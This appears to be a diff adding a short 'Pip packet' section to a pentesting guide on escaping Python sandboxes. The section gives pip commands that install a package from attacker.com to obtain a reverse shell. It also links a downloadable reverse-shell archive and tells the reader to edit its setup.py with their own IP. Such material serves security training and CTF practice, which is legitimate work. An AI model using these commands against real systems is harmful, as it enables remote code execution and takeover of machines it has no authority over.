@@ -295,6 +295,19 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
          47 RETURN_VALUE
 ```
 
+## Pip packet
+
+If you have access to `pip` or to `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
+
+```bash
+pip install http://attacker.com/Rerverse.tar.gz
+pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
+```
+
+You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
+
+{% file src="../../.gitbook/assets/reverse.tar.gz" %}
+
 ## References
 
 * [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
